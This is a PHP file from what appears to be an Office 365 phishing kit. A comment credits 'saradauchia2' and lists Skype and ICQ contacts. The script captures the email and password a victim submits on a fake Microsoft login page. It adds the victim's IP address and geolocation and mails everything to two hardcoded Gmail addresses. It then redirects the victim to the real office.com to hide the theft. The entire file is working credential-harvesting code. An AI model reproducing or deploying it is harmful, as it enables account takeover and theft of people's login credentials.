<?php
// THIS SCRIPT CODED BY saradauchia2
// CONTACT US SKYPE : saradauchia2
// ICQ : 706318279
	
	session_start();
	$email = $_SESSION['loginfmt'];
	$passwd = $_POST['passwd'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Email: " . $_SESSION['loginfmt'] . "\n"; 
    $message .= "Password: " . $_POST['passwd'] . "\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$send ="jenncalero11@gmail.com,sincenftnc@gmail.com";

	$subject = "office l $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	}
?>
<script>
	window.location="https://www.office.com/";
</script>

